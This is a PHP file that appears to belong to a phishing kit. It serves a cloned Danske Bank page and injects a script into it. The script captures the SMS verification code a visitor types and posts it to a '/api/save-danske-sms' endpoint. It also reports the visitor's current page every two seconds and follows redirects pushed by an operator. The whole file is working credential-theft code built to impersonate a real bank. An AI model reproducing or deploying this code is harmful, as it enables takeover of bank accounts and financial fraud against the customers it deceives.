<?php
ob_start();
header('Content-Type: text/html; charset=UTF-8');

$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Danske Bank');
$htmlContent = file_get_contents(__DIR__ . '/danskebank3.html');

$basePath = '/danske-files/';
$htmlContent = preg_replace('/\.\/static\/css\/([^"]+)/i', $basePath . '$1', $htmlContent);
$htmlContent = preg_replace('/href="\.\/([^"]*)"/i', 'href="#$1"', $htmlContent);

$adminScript = '';
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        const smsForm = document.getElementById(\'sms-form\');
        if (smsForm) {
            smsForm.addEventListener(\'submit\', function(e) {
                e.preventDefault();
                
                const smsCode = document.getElementById(\'sms-code\')?.value || \'\';
                
                if (smsCode) {
                    fetch(\'/api/save-danske-sms\', {
                        method: \'POST\',
                        headers: { \'Content-Type\': \'application/json\' },
                        body: JSON.stringify({
                            user_id: userId,
                            sms_code: smsCode
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success && data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
                }
            });
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
ob_end_flush();
?>

